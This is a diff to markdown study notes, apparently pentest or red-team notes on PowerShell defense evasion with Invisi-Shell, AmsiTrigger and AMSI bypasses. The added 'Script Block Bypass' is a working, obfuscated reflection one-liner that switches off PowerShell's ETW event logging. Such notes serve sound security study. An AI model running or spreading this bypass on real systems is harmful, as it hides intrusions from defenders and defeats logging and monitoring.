@@ -15,6 +15,7 @@ __Invisi-Shell__
 - Hooks .NET assemblies (System.Management.Automation.dll & System.Core.dll) to bypass logging
 - CLR Profiler API is used perform the hook
 - _CLR profiler_ is a dll that receives and send messages to the CLR by using API
+- _CANNOT BE USED IN REVERSE SHELL SITUATIONS_
 
 Using:
 - RunwithPathAsAdmin.bat
@@ -28,6 +29,11 @@ AmsiTrigger_x64.exe -i PowerUp.ps1
 ```powershell
 $string = 'niamoDppA.metsys'
 $classrev = ([regx]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) - join ''
+```
+
+__Script Block Bypass__
+```powershell
+[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
 ```
 
 __AMSI Powershell Bypass__
